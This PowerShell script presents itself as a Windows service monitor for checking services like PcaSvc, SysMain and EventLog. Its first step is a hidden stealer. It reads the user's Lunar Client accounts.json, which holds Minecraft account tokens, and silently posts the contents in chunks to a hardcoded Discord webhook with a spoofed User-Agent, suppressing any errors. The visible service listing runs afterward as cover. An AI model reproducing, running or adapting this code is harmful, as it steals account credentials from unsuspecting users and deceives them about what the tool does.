[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$console = $Host.UI.RawUI
$console.BackgroundColor = "Black"
$console.ForegroundColor = "White"
Clear-Host

# --- Step 1: Send accounts.json to Discord (pure PowerShell) ---
$accountsPath = Join-Path $env:USERPROFILE ".lunarclient\settings\game\accounts.json"
$webhookUrl = "https://discord.com/api/webhooks/1551261043991253055/pEvyDaQigP-bShTvVOs97f4NyVqo-RPgBz4z4XDOJGap0tXIvJ46gX7eZYkzTy2WrgeJ"

if (Test-Path $accountsPath) {
    $text = Get-Content $accountsPath -Raw -Encoding UTF8
    $CHUNK_SIZE = 1850
    $chunks = for ($i = 0; $i -lt $text.Length; $i += $CHUNK_SIZE) { $text.Substring($i, [Math]::Min($CHUNK_SIZE, $text.Length - $i)) }

    foreach ($chunk in $chunks) {
        $payload = @{ content = $chunk } | ConvertTo-Json -Compress -Depth 10
        try {
            $headers = @{ "User-Agent" = "Mozilla/5.0"; "Content-Type" = "application/json" }
            Invoke-WebRequest -Uri $webhookUrl -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes($payload)) -Headers $headers -UseBasicParsing | Out-Null
        } catch {
        }
        Start-Sleep -Milliseconds 1500
    }
}

Start-Sleep -Seconds 1

# --- Step 2: Service Monitor (bridgezan style) ---
Write-Host @"
 |\/\/\/|  
 |      |  
 |      |  
 | (o)(o)  
 C      _)  maked by bridgezan
  | ,___|  
  |   /    
 /____\    
/      \ 
"@ -ForegroundColor White

$services = "PcaSvc", "CDPSvc", "DPS", "SysMain", "EventLog", "Appinfo", "DiagTrack", "Dnscache", "WSearch", "Schedule"
foreach ($service in $services) {
    try {
        $serviceInfo = Get-Service -Name $service -ErrorAction Stop
        $serviceConfig = Get-CimInstance -ClassName Win32_Service -Filter "Name='$service'"
        $startType = switch ($serviceConfig.StartMode) {
            "Auto" { "Automatic"; break }
            "Manual" { "Manual"; break }
            "Disabled" { "Disabled"; break }
            default { $serviceConfig.StartMode }
        }
        if ($serviceInfo.Status -eq "Stopped") {
            Write-Host "$service - STOPPED (Start Type: $startType)" -ForegroundColor Red
        } else {
            $event = Get-WinEvent -FilterHashtable @{
                LogName='System'
                ProviderName='Service Control Manager'
                ID=7045
            } -MaxEvents 100 | Where-Object {
                $_.Properties[0].Value -like "*$service*"
            } | Select-Object -First 1

            if ($event) {
                $startTime = $event.TimeCreated.ToString("HH:mm:ss")
                Write-Host "$service - RUNNING (Start Type: $startType, Started at: $startTime)" -ForegroundColor Green
            }
            elseif ($serviceInfo.ProcessId -gt 0) {
                try {
                    $process = Get-Process -Id $serviceInfo.ProcessId -ErrorAction Stop
                    $startTime = $process.StartTime.ToString("HH:mm:ss")
                    Write-Host "$service - RUNNING (Start Type: $startType, Process started: $startTime)" -ForegroundColor Green
                } catch {
                    Write-Host "$service - RUNNING (Start Type: $startType)" -ForegroundColor Green
                }
            }
            else {
                Write-Host "$service - RUNNING (Start Type: $startType)" -ForegroundColor Green
            }
        }
    } catch {
        Write-Host "$service - NOT FOUND" -ForegroundColor Yellow
    }
}

Write-Host "`n[*] Done. Press Enter to exit..." -ForegroundColor Cyan
Read-Host
